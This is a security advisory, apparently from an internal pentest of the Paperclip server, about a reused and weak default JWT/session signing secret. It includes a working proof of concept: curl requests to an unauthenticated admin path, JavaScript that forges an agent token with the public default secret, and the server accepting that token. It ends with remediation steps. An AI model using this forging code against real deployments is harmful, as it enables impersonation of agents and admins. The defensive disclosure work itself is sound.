# Critical · C-1 · JWT signing secret reuse and weak `.env.example` default

- **Status:** Open · **Confirmed live**
- **Severity:** Critical
- **CWE:** CWE-330, CWE-321, CWE-347
- **Found by:** Manual review
- **Detected:** 2026-05-18
- **Location(s):**
  - `server/src/agent-auth-jwt.ts:29`
  - `server/src/auth/better-auth.ts:95`
  - `.env.example:4`

## Summary

`createLocalAgentJwt()` derives its HS256 signing secret with
`process.env.PAPERCLIP_AGENT_JWT_SECRET?.trim() || process.env.BETTER_AUTH_SECRET?.trim()`.
The same `BETTER_AUTH_SECRET` is also the signing key for Better-Auth session
cookies. `.env.example` ships `BETTER_AUTH_SECRET=paperclip-dev-secret` (13
bytes, ~40 bits of entropy).

## Impact

An operator who leaves the example value in place — or anyone who reads it
in docs/guides — can forge:

1. Agent JWTs as **any** agent (`sub`, `company_id`, `adapter_type`, `run_id`
   are all attacker-controlled).
2. Better-Auth session cookies for **any** user, including admins.

Because one secret signs both, leaking either one compromises both surfaces.

## Reproduction

### Result: **Confirmed live**

Steps executed against a default-deployment server (`BETTER_AUTH_SECRET=paperclip-dev-secret`):

1. Started the server: `pnpm --filter @paperclipai/server dev` listening on `127.0.0.1:3100`.
2. Created a company and agent via the implicit-board admin path (no auth):
   ```bash
   curl -X POST http://localhost:3100/api/companies -H 'content-type: application/json' \
        -d '{"name":"Victim Inc"}'
   # → 201, id=34b88483-…

   curl -X POST http://localhost:3100/api/companies/34b88483-.../agents -H 'content-type: application/json' \
        -d '{"name":"Real Agent","role":"engineer","adapterType":"acpx_local","adapterConfig":{}}'
   # → 201, id=c9557290-…
   ```
3. Minted a JWT externally using the public default secret:
   ```js
   const SECRET = "paperclip-dev-secret";
   const claims = {
     sub: "c9557290-ab8f-4c75-a54a-1d28a1fabcd4",
     company_id: "34b88483-…",
     adapter_type: "acpx_local",
     run_id: randomUUID(),
     iat: now, exp: now + 3600,
     iss: "paperclip", aud: "paperclip-api",
   };
   const sig = createHmac("sha256", SECRET).update(`${b64u(JSON.stringify({alg:"HS256",typ:"JWT"}))}.${b64u(JSON.stringify(claims))}`).digest("base64url");
   ```
4. Used the forged token against `GET /api/agents/me`:
   ```
   GET /api/agents/me  Authorization: Bearer <forged>
   → 200 OK
   {"id":"c9557290-ab8f-4c75-a54a-1d28a1fabcd4","companyId":"34b88483-…","name":"Real Agent",
    "adapterConfig":{…},"access":{"membership":{…},"grants":[{"permissionKey":"tasks:assign",…}]}}
   ```

The server's own `verifyLocalAgentJwt()` accepted the forged signature, looked up the agent in Postgres,
and returned its full record including membership and permission grants.

**Standalone reproducer:** `/tmp/pentest/poc-c1-jwt-forge.mjs`
**Pen-test log:** `report/security/pentest/2026-05-18-pentest-notes.md` §C-1

## Fix

1. Remove the `||` fallback in `agent-auth-jwt.ts:29`; require a separate
   `PAPERCLIP_AGENT_JWT_SECRET` env var.
2. At startup, fail the process if `NODE_ENV === "production"` AND either
   secret is missing / shorter than 32 bytes / equal to `paperclip-dev-secret`.
3. Consider RS256 for agent JWTs so the verifying server doesn't hold the
   minting key.
4. Replace `.env.example` value with a placeholder like
   `<openssl rand -base64 32>`.

## References

- Umbrella scan report: `report/security/2026-05-18-security-scan.md`
- Pen-test notes: `report/security/pentest/2026-05-18-pentest-notes.md`
